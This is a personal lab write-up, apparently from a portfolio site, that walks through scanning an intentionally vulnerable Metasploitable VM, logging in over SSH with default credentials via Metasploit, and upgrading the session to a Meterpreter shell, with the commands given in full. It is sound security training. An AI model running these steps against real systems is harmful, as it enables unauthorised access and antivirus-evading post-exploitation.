---
title: Upgrading to Meterpreter Shell Using Metasploit
permalink: /metasploit1
parent: Pentesting
---
# Upgrading to Meterpreter Shell Using Metasploit
{: .no_toc }

{: .note }
Pentesting, Ethical Hacking, Kali Linux, Metasploit, Metasploitable, Virtual Machines, Networking
{: .fs-3 }

#### Contents
{: .no_toc }
- TOC
{:toc}

## Scenario
In this lab, I will establish a remote connection to a vulnerable machine using Metasploit. After gaining access to the machine, I will upgrade the limited shell to a meterpreter shell. Meterpreter operates entirely in memory, making it more stealthy and less likely to be detected by antivirus software.  It also provides a rich command set that allows for advanced post-exploitation activities. This includes commands for interacting with the file system, networking, system, and more.

## Goals & Objectives
1. Use VMWare Workstation Player to run separate instances of Kali Linux and Metasploitable, an intentionally vulnerable virtual machine.
2. Perform an nmap scan on the target machine, detecting open ports and a list of services and their versions.
3. Log in to the target machine using SSH.
4. Upgrade the limited shell to a meterpreter shell.

## Results
### ðŸ“„ Task 1: Run Kali Linux and Metasploitable

I download pre-built images for Kali Linux and Metasploitable and run them in VMWare Workstation Player.

![](/assets/images/101_71_metasploit1/step1.png)

<br>
<br>
### ðŸ“„ Task 2: Run Metasploit in Kali Linux

![](/assets/images/101_71_metasploit1/step2.png)

<br>
<br>
### ðŸ“„ Task 3: Find the IP address of the target machine 

I use ```ifconfig``` to find the IP address of the target machine: 192.168.28.128

![](/assets/images/101_71_metasploit1/step3.png)

<br>
<br>
### ðŸ“„ Task 4: Scan the target machine using db_nmap

In Metasploit, I scan the target machine using ```db_nmap -sV 192.168.28.128```. This command stores the results of an nmap scan in Metasploitâ€™s database. This database allows me to keep track of and manage the scan results.

![](/assets/images/101_71_metasploit1/step4.png)

I notice that SSH (secure shell) is running on port 22. SSH is an encrypted network protocol used to remotely interact with an Operating System.

<br>
<br>
### ðŸ“„ Task 5: Log in to the target machine using SSH

To log in to the target machine using SSH, I run the following commands:

```bash
use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.28.128
set rport 22
set username msfadmin
set password msfadmin
run
```

Note: msfadmin is the default username and password of the Metasploitable VM.

```use auxiliary/scanner/ssh/ssh_login``` allows me to use the ssh_login module to remotely log in to the target machine  
```set rhosts``` sets the IP address of the target machine  
```set rport``` specifies the port number  
```set username``` and ```set password``` specifies the login credentials to access the target machine

![](/assets/images/101_71_metasploit1/step5.png)

The ```sessions``` command shows active SSH sessions. Currently, the active session is a limited shell.

<br>
<br>
### ðŸ“„ Task 6: Upgrade the limited shell to a meterpreter shell

To upgrade the limited shell to a meterpreter shell, I run the following commands:

```bash
use post/multi/manage/shell_to_meterpreter 
set session 1 
run
```

```use post/multi/manage/shell_to_meterpreter``` allows me to upgrade a shell session to meterpreter shell  
```set session 1``` upgrades the SSH sessions to a meterpreter shell

![](/assets/images/101_71_metasploit1/step6.png)

Running the ```sessions``` command reveals a second session, which is the meterpreter shell.

<br>
<br>
### ðŸ“„ Task 7: Switch to the meterpreter shell

To switch to the meterpreter shell, I use the following command: ```session -i 2```.

![](/assets/images/101_71_metasploit1/step7.png)

---

<a href="#top" id="back-to-top">Back to top</a>